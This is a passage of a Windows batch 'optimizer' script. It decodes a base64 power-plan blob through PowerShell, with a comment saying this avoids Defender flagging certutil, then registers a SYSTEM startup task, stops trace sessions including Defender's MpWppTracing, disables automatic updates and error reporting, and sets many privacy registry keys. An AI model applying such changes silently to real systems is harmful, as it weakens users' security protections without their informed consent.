echo AAAAACQAAAAyYTczNzQ0MS0xOTMwLTQ0MDItOGQ3Ny1iMmJlYmJhMzA4YTMAAAAA>> "!_POWTMP_B64!"
echo 8P///2xmAQDoCQAAM2MwYvj///9gCgAAEAAAADJhNzNIBwAANTQ1M4j///9uayAA>> "!_POWTMP_B64!"
echo AWpECeHn2AEAAAAACAYAAAAAAAAAAAAA//////////8BAAAAsAUAAGADAAD/////>> "!_POWTMP_B64!"
echo AAAAAAAAAAAcAAAABAAAAAAAAAAkAAAANDhlNmI3YTYtNTBmNS00NzgyLWE1ZDQt>> "!_POWTMP_B64!"
echo NTNiYjhmMDdlMjI2AAAAANj///92aw4ABAAAgAAAAAAEAAAAAQAuAEFDU2V0dGlu>> "!_POWTMP_B64!"
echo Z0luZGV4LTWI////bmsgAAFqRAnh59gBAAAAACAAAAACAAAAAAAAAPAIAAD/////>> "!_POWTMP_B64!"
echo AAAAAP////9gAwAA/////0gAAAAAAAAAAAAAAAAAAAAAAAAAJAAAADU0NTMzMjUx>> "!_POWTMP_B64!"
echo LTgyYmUtNDgyNC05NmMxLTQ3YjYwYjc0MGQwMAAAAACI////bmsgAAFqRAnh59gB>> "!_POWTMP_B64!"
echo AAAAAEgHAAAAAAAAAAAAAP//////////AQAAAHAIAABgAwAA/////wAAAAAAAAAA>> "!_POWTMP_B64!"
echo HAAAAAQAAAAAAAAAJAAAADRiOTJkNzU4LTVhMjQtNDg1MS1hNDcwLTgxNWQ3OGFl>> "!_POWTMP_B64!"
echo ZTExOQAAAAD4////CAkAAAgAAAA0Yjky2P///3ZrDgAEAACAZAAAAAQAAAABAGPq>> "!_POWTMP_B64!"
echo QUNTZXR0aW5nSW5kZXjJKfj///9ICAAAiP///25rIAABakQJ4efYAQAAAABIBwAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAD//////////wEAAAA4CAAAYAMAAP////8AAAAAAAAAABwAAAAEAAAA>> "!_POWTMP_B64!"
echo AAAAACQAAAA3YjIyNDg4My1iM2NjLTRkNzktODE5Zi04Mzc0MTUyY2JlN2MAAAAA>> "!_POWTMP_B64!"
echo 6P///2xmAgDABwAANGI5MngIAAA3YjIy2P///3ZrDgAEAACAZAAAAAQAAAABAAAA>> "!_POWTMP_B64!"
echo QUNTZXR0aW5nSW5kZXgtNIj///9uayAAPkaU0+Dn2AEAAAAAIAAAAAEAAAAAAAAA>> "!_POWTMP_B64!"
echo gAYAAP////8AAAAA/////2ADAAD/////SAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAA>> "!_POWTMP_B64!"
echo NzUxNmI5NWYtZjc3Ni00NDY0LThjNTMtMDYxNjdmNDBjYzk5AAAAAMD///9sZgUA>> "!_POWTMP_B64!"
echo 6AIAADAwMTIoBQAAMjQ1ZAgGAAAyYTczSAcAADU0NTMwCQAANzUxNgAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAACI////bmsgAD5GlNPg59gBAAAAADAJAAAAAAAAAAAAAP//////////>> "!_POWTMP_B64!"
echo AQAAAJAGAABgAwAA/////wAAAAAAAAAAHAAAAAQAAAAAAAAAJAAAADNjMGJjMDIx>> "!_POWTMP_B64!"
echo LWM4YTgtNGUwNy1hOTczLTZiMTRjYmNiMmI3ZQAAAADY////dmsOAAQAAIAAAAAA>> "!_POWTMP_B64!"
echo BAAAAAEAAABBQ1NldHRpbmdJbmRleAAAeAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=>> "!_POWTMP_B64!"
:: Decode base64 back to binary
:: Decode base64 using PowerShell (avoids Defender flagging certutil)
set "_B64F=!_POWTMP_B64!"
set "_POWF=!_POWTMP!"
powershell -NoProfile -Command "[IO.File]::WriteAllBytes($env:_POWF,[Convert]::FromBase64String(([IO.File]::ReadAllText($env:_B64F)).Trim()))" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    set STEP_ERR=1
) else (
    :: Disable Modern Standby (S0) only if not already disabled, to unlock custom power plans
    for /f "tokens=3" %%V in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v PlatformAoAcOverride 2^>nul ^| findstr /i "0x"') do set "_AOAC=%%V"
    if not "!_AOAC!"=="0x0" (
        REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PlatformAoAcOverride" /t REG_DWORD /d 0 /f >nul 2>&1
    )
    :: Import the plan
    powercfg -import "!_POWTMP!" >nul 2>&1
    :: Verify the scheme actually registered before doing anything else with it
    powercfg -list | findstr /i "e62924f9-da5f-42c4-9c17-926bc1804ab8" >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        :: Import did not register the scheme - do not touch ActivePowerScheme, leave existing plan alone
        set STEP_ERR=1
    ) else (
        :: Try setactive now - will fail silently if Modern Standby is still active (needs reboot first)
        powercfg -setactive e62924f9-da5f-42c4-9c17-926bc1804ab8 >nul 2>&1
        :: Write registry regardless - covers both immediate and post-reboot activation paths
        REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes" /v "ActivePowerScheme" /t REG_SZ /d "e62924f9-da5f-42c4-9c17-926bc1804ab8" /f >nul 2>&1
        REG ADD "HKLM\SYSTEM\ControlSet001\Control\Power\User\PowerSchemes" /v "ActivePowerScheme" /t REG_SZ /d "e62924f9-da5f-42c4-9c17-926bc1804ab8" /f >nul 2>&1
        :: Apply CPU idle-disable directly to the plan GUID
        powercfg -setacvalueindex e62924f9-da5f-42c4-9c17-926bc1804ab8 SUB_PROCESSOR IDLEDISABLE 1 >nul 2>&1
        powercfg -setdcvalueindex e62924f9-da5f-42c4-9c17-926bc1804ab8 SUB_PROCESSOR IDLEDISABLE 1 >nul 2>&1
        powercfg -setactive e62924f9-da5f-42c4-9c17-926bc1804ab8 >nul 2>&1
        powercfg -changename e62924f9-da5f-42c4-9c17-926bc1804ab8 "WinLO" "Win Light Optimizer Performance Plan" >nul 2>&1
        :: Create a self-deleting startup task to force WinLO active on next boot
        :: Runs 10 seconds after startup (gives power manager time to finish init)
        :: then deletes itself so it only ever fires once
        powershell -NoProfile -Command "$a=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c timeout /t 10 /nobreak >nul && powercfg -setactive e62924f9-da5f-42c4-9c17-926bc1804ab8 && powercfg -changename e62924f9-da5f-42c4-9c17-926bc1804ab8 WinLO \"Win Light Optimizer Performance Plan\" && schtasks /delete /tn WinLOActivatePlan /f';$t=New-ScheduledTaskTrigger -AtStartup;Register-ScheduledTask -TaskName WinLOActivatePlan -Action $a -Trigger $t -RunLevel Highest -User SYSTEM -Force -ErrorAction SilentlyContinue|Out-Null" >nul 2>&1
    )
)
:: Cleanup temp files
if exist "!_POWTMP_B64!" del "!_POWTMP_B64!" >nul 2>&1
if exist "!_POWTMP!" del "!_POWTMP!" >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] WinLO Power Plan
    set /a PASS+=1
) else (
    echo  [FAIL] WinLO Power Plan
    set /a FAIL+=1
    echo Core Power Plan>> "!_FAILS!"
)

:: ================================================
:: STEP 14 - Disable Event Trace Sessions (ETS)
:: ================================================
echo [STEP 14/32] Disabling Event Trace Sessions (ETS)...
set STEP_ERR=0
for %%X in (
    "NTFSLog"
    "WiFiDriverIHVSession"
    "WiFiDriverSession"
    "WiFiSession"
    "SleepStudyTraceSession"
    "1DSListener"
    "MpWppTracing"
    "NVIDIA-NVTOPPS-NoCat"
    "NVIDIA-NVTOPPS-Filter"
    "Circular Kernel Context Logger"
    "DiagLog"
    "LwtNetLog"
    "Microsoft-Windows-Rdp-Graphics-RdpIdd-Trace"
    "NetCore"
    "RadioMgr"
    "ReFSLog"
    "WdiContextLog"
    "ShadowPlay"
) do (
    logman stop %%X -ets >nul 2>&1
)
if !STEP_ERR!==0 (
    echo  [OK] Event Trace Sessions ETS
    set /a PASS+=1
) else (
    echo  [FAIL] Event Trace Sessions ETS
    set /a FAIL+=1
    echo Event Trace Sessions ETS>> "!_FAILS!"
)

:: ================================================
:: STEP 15 - Privacy and Bloat Tweaks
:: ================================================
echo [STEP 15/32] Applying Privacy and Bloat Tweaks...
set STEP_ERR=0
:: Location and Sensors
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocation" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocationScripting" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableWindowsLocationProvider" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowExperimentation" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowLocation" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Message Sync
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Messaging" /v "AllowMessageSync" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Microsoft Edge
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "BackgroundModeEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "StartupBoostEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "AddressBarMicrosoftSearchInBingProviderEnable" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "AutofillAddressEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "AutofillCreditCardEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "ConfigureDoNotTrack" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "EdgeShoppingAssistantEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "HubsSidebarEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "LocalProvidersEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "PaymentMethodQueryEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "PersonalizationReportingEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "SearchSuggestEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "UserFeedbackAllowed" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "WebWidgetAllowed" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: News and Interests
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Dsh" /v "AllowNewsAndInterests" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft" /v "AllowNewsAndInterests" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Activity Feed
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableActivityFeed" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Advertising Info
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: App Compatibility / Telemetry Inventory
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableUAR" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\AppCompat" /v "DisablePCA" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Cloud Content / Spotlight
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "ConfigureWindowsSpotlight" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightFeatures" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightOnActionCenter" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightOnSettings" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightWindowsWelcomeExperience" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "IncludeEnterpriseSpotlight" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Policies\Microsoft\Windows\CloudContent" /v "DisableTailoredExperiencesWithDiagnosticData" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Copilot and Cortana
REG ADD "HKCU\Software\Policies\Microsoft\Windows\WindowsCopilot" /v "TurnOffWindowsCopilot" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Experience" /v "AllowCortana" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsAI" /v "DisableAIDataAnalysis" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsCopilot" /v "TurnOffWindowsCopilot" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Data Collection / Telemetry
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DisableOneSettingsDownloads" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "LimitDiagnosticLogCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "MaxTelemetryAllowed" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\TextInput" /v "AllowLinguisticDataCollection" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Delivery Optimization
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "DODownloadMode" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Diagnostic Provider
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\ScriptedDiagnosticsProvider\Policy" /v "DisableQueryRemoteServer" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Error Reporting
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\PCHealth\ErrorReporting" /v "DoReport" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Explorer
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableSearchBoxSuggestions" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "TurnOffSPIAnimations" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Windows Feeds
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds" /v "EnableFeeds" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Game DVR
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\BcastDVRUserService" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement" /v "AllowGameDVR" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Handwriting Error Reports
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Input Personalization
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "AllowInputPersonalization" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\InputPersonalization" /v "AllowInputPersonalization" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Privacy and Bloat Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Privacy and Bloat Tweaks
    set /a FAIL+=1
    echo Privacy and Bloat Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 16 - Additional Privacy and Service Tweaks
:: ================================================
echo [STEP 16/32] Applying Additional Privacy and Service Tweaks...
set STEP_ERR=0
:: Password Reveal button
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\CredUI" /v "DisablePasswordReveal" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Tailored Experiences / Privacy
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Speech Model Updates
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Speech" /v "AllowSpeechModelUpdate" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SpeechGestures" /v "RDCPolicyCollectionLevel" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Telephony and CEIP Telemetry (best-effort - keys may not exist on all Windows versions)
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Telephony" /v "KmddspDebugLevel" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WTDS\FeatureFlags" /v "BlockUxDisabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WTDS\FeatureFlags" /v "TelemetryCallsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\AppV\CEIP" /v "CEIPEnable" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\SQM" /v "DisableCustomerImprovementProgram" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Messenger\Client" /v "CEIP" /t REG_DWORD /d 2 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable Automatic Windows Updates
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: WCM Service
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\Local" /v "WCMPresent" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\GroupPolicy" /v "fDisablePowerManagement" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Windows Search
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortanaAboveLock" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
